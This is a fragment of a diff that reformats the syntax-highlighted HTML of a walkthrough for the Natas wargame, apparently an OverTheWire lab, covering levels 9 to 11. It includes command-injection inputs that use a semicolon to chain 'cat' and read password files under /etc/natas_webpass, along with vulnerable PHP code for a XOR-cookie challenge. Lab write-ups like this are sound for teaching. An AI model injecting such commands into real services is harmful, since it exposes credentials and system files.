-&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;array_key_exists&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;needle&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$_REQUEST&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
-    &lt;span class="nv"&gt;$key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$_REQUEST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;needle&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
-&lt;span class="p"&gt;}&lt;/span&gt;
-&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$key&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
-    &lt;span class="nb"&gt;passthru&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;grep -i &lt;/span&gt;&lt;span class="si"&gt;$key&lt;/span&gt;&lt;span class="s2"&gt; dictionary.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
-&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;span class="cp"&gt;$key = &amp;quot;&amp;quot;;&lt;/span&gt;
+&lt;span class="cp"&gt;if(array_key_exists(&amp;quot;needle&amp;quot;, $_REQUEST)) {&lt;/span&gt;
+&lt;span class="cp"&gt;    $key = $_REQUEST[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;needle&amp;quot;&lt;/span&gt;&lt;span class="cp"&gt;];&lt;/span&gt;
+&lt;span class="cp"&gt;}&lt;/span&gt;
+&lt;span class="cp"&gt;if($key != &amp;quot;&amp;quot;) {&lt;/span&gt;
+&lt;span class="cp"&gt;    passthru(&amp;quot;grep -i $key dictionary.txt&amp;quot;);&lt;/span&gt;
+&lt;span class="cp"&gt;}&lt;/span&gt;
 &lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;
 &lt;span class="nt"&gt;&amp;lt;/pre&amp;gt;&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
@@ -204,7 +202,7 @@ Output:
 &lt;p&gt;What should we add to the original &lt;em&gt;grep&lt;/em&gt; command?&lt;/p&gt;
 &lt;p&gt;In &lt;strong&gt;Bash&lt;/strong&gt;, the &lt;em&gt;semicolon&lt;/em&gt; permits putting more than one command on the same line. Adding a &lt;strong&gt;;&lt;/strong&gt; to the input allows us to  add a &lt;strong&gt;cat&lt;/strong&gt; after that.&lt;/p&gt;
 &lt;p&gt;The crafted input is:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;; cat /etc/natas_webpass/natas10
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;cat&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;etc&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;natas_webpass&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;natas10&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -215,7 +213,7 @@ Output:
 &lt;p&gt;For security reasons, we now filter on certain characters.&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;We take a look at the source code:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="x"&gt;&amp;lt;pre&amp;gt;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="x"&gt;&amp;lt;pre&amp;gt;&lt;/span&gt;
 &lt;span class="cp"&gt;&amp;lt;?&lt;/span&gt;
 &lt;span class="nv"&gt;$key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
 &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;array_key_exists&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;needle&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$_REQUEST&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
@@ -237,7 +235,7 @@ Output:
 &lt;p&gt;We cannot use the same attack as before with a semicolon!&lt;/p&gt;
 &lt;p&gt;We need to some other injection that does not need those symbols.&lt;/p&gt;
 &lt;p&gt;When I was messing around in the previous level I noticed that we can use &lt;strong&gt;""&lt;/strong&gt; as an input.  Awesome. The following input reveals the password:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&amp;quot;&amp;quot;  cat /etc/natas_webpass/natas11
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="s"&gt;&amp;quot;&amp;quot;&lt;/span&gt;  &lt;span class="n"&gt;cat&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;etc&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;natas_webpass&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;natas11&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -246,76 +244,76 @@ Output:
 &lt;blockquote&gt;
 &lt;p&gt;cookies are protected with XOR encryption&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/aD4CKbY.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/aD4CKbY.png" /&gt;&lt;/p&gt;
 &lt;p&gt;Let's inspect the source code in several steps. First, we have this suspicious array:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$defaultdata = array( &amp;quot;showpassword&amp;quot;=&amp;gt;&amp;quot;no&amp;quot;, &amp;quot;bgcolor&amp;quot;=&amp;gt;&amp;quot;#ffffff&amp;quot;);
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;defaultdata&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;showpassword&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;no&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;bgcolor&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;#ffffff&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;We will see soon that this array is passed to a cookie as an encrypted XOR string.&lt;/p&gt;
 &lt;p&gt;What happens if we manage to set &lt;em&gt;showpassword&lt;/em&gt; to &lt;em&gt;yes&lt;/em&gt;? This is answered in the end of the code:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;if($data[&amp;quot;showpassword&amp;quot;] == &amp;quot;yes&amp;quot;) {
-    print &amp;quot;The password for natas12 is &amp;lt;censored&amp;gt;&amp;lt;br&amp;gt;&amp;quot;;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$data&lt;/span&gt;&lt;span class="err"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;showpassword&amp;quot;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt; == &amp;quot;yes&amp;quot;) {
+    print &amp;quot;The password for natas12 is &lt;span class="nt"&gt;&amp;lt;censored&amp;gt;&amp;lt;br&amp;gt;&lt;/span&gt;&amp;quot;;
 }
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;We know our way now.&lt;/p&gt;
 &lt;p&gt;We then have this XOR function that take an input value, &lt;em&gt;$text&lt;/em&gt;, and XOR to a variable, &lt;em&gt;$key&lt;/em&gt;. So we know that XORing the output with what we sent as the input can return the content of &lt;em&gt;$key&lt;/em&gt;:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;xor_encrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;$in&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
-    &lt;span class="nx"&gt;$key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;lt;censored&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-    &lt;span class="nx"&gt;$text&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;$in&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-    &lt;span class="nx"&gt;$outText&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nx"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;xor_encrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$in&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="nv"&gt;$key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;lt;censored&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="nv"&gt;$text&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$in&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="nv"&gt;$outText&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
 
     &lt;span class="c1"&gt;// Iterate through each character&lt;/span&gt;
-    &lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;$i&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="nx"&gt;$i&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;strlen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;$text&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="nx"&gt;$i&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
-    &lt;span class="nx"&gt;$outText&lt;/span&gt; &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;$text&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;$i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;^&lt;/span&gt; &lt;span class="nx"&gt;$key&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;$i&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="nx"&gt;strlen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;$key&lt;/span&gt;&lt;span class="p"&gt;)];&lt;/span&gt;
-    &lt;span class="p"&gt;}&lt;/span&gt;
-    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;$outText&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-&lt;span class="p"&gt;}&lt;/span&gt;
+    &lt;span class="nb"&gt;for&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$i&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="nv"&gt;$i&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;strlen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$text&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="nv"&gt;$i&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="nv"&gt;$outText&lt;/span&gt; &lt;span class="nx"&gt;.&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$text&lt;/span&gt;&lt;span class="err"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;$i&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt; ^ $key&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;$i&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="nx"&gt;strlen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$key&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;;
+    }
+    return $outText;
+}
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;The rest of the code is only important to show that the string encoded in &lt;em&gt;base64&lt;/em&gt; before it's sent to the cookie. The function in the bottom just changes the color of the background:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;loadData&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;$def&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
-    &lt;span class="nx"&gt;global&lt;/span&gt; &lt;span class="nx"&gt;$_COOKIE&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-    &lt;span class="nx"&gt;$mydata&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;$def&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;array_key_exists&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;data&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;$_COOKIE&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
-    &lt;span class="nx"&gt;$tempdata&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;json_decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;xor_encrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;base64_decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;$_COOKIE&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;data&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;])),&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
-    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;is_array&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;$tempdata&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nx"&gt;array_key_exists&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;showpassword&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;$tempdata&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nx"&gt;array_key_exists&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;bgcolor&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;$tempdata&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
-        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;preg_match&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/^#(?:[a-f\d]{6})$/i&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;$tempdata&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;bgcolor&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
-        &lt;span class="nx"&gt;$mydata&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;showpassword&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;$tempdata&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;showpassword&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
-        &lt;span class="nx"&gt;$mydata&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;bgcolor&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;$tempdata&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;bgcolor&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
-        &lt;span class="p"&gt;}&lt;/span&gt;
-    &lt;span class="p"&gt;}&lt;/span&gt;
-    &lt;span class="p"&gt;}&lt;/span&gt;
-    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;$mydata&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-&lt;span class="p"&gt;}&lt;/span&gt;
-&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;saveData&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;$d&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
-    &lt;span class="nx"&gt;setcookie&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;data&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;base64_encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;xor_encrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;json_encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;$d&lt;/span&gt;&lt;span class="p"&gt;))));&lt;/span&gt;
-&lt;span class="p"&gt;}&lt;/span&gt;
-&lt;span class="nx"&gt;$data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;loadData&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;$defaultdata&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
-&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;array_key_exists&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;bgcolor&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;$_REQUEST&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
-    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;preg_match&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/^#(?:[a-f\d]{6})$/i&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;$_REQUEST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;bgcolor&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
-        &lt;span class="nx"&gt;$data&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;bgcolor&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;$_REQUEST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;bgcolor&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
-    &lt;span class="p"&gt;}&lt;/span&gt;
-&lt;span class="p"&gt;}&lt;/span&gt;
-&lt;span class="nx"&gt;saveData&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;$data&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
-&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;form&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
-&lt;span class="nx"&gt;Background&lt;/span&gt; &lt;span class="nx"&gt;color&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;input&lt;/span&gt; &lt;span class="nx"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nx"&gt;bgcolor&lt;/span&gt; &lt;span class="nx"&gt;value&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;lt;?=$data[&amp;#39;bgcolor&amp;#39;]?&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
-&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;input&lt;/span&gt; &lt;span class="nx"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nx"&gt;submit&lt;/span&gt; &lt;span class="nx"&gt;value&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Set color&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
-&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="err"&gt;/form&amp;gt;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nx"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;loadData&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$def&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="bp"&gt;global&lt;/span&gt; &lt;span class="nv"&gt;$_COOKIE&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="nv"&gt;$mydata&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$def&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;array_key_exists&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;data&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$_COOKIE&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="nv"&gt;$tempdata&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;json_decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;xor_encrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;base64_decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_COOKIE&lt;/span&gt;&lt;span class="err"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;data&amp;quot;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;)), true);
+    if(is_array($tempdata) &lt;span class="err"&gt;&amp;amp;&amp;amp;&lt;/span&gt; array_key_exists(&amp;quot;showpassword&amp;quot;, $tempdata) &lt;span class="err"&gt;&amp;amp;&amp;amp;&lt;/span&gt; array_key_exists(&amp;quot;bgcolor&amp;quot;, $tempdata)) {
+        if (preg_match(&amp;#39;/^#(?:&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;a&lt;/span&gt;&lt;span class="na"&gt;-f&lt;/span&gt;&lt;span class="o"&gt;\&lt;/span&gt;&lt;span class="nb"&gt;d&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;{6})$/i&amp;#39;, $tempdata&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;bgcolor&amp;#39;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;)) {
+        $mydata&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;showpassword&amp;#39;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt; = $tempdata&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;showpassword&amp;#39;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;;
+        $mydata&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;bgcolor&amp;#39;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt; = $tempdata&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;bgcolor&amp;#39;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;;
+        }
+    }
+    }
+    return $mydata;
+}
+function saveData($d) {
+    setcookie(&amp;quot;data&amp;quot;, base64_encode(xor_encrypt(json_encode($d))));
+}
+$data = loadData($defaultdata);
+if(array_key_exists(&amp;quot;bgcolor&amp;quot;,$_REQUEST)) {
+    if (preg_match(&amp;#39;/^#(?:&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;a&lt;/span&gt;&lt;span class="na"&gt;-f&lt;/span&gt;&lt;span class="o"&gt;\&lt;/span&gt;&lt;span class="nb"&gt;d&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;{6})$/i&amp;#39;, $_REQUEST&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;bgcolor&amp;#39;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;)) {
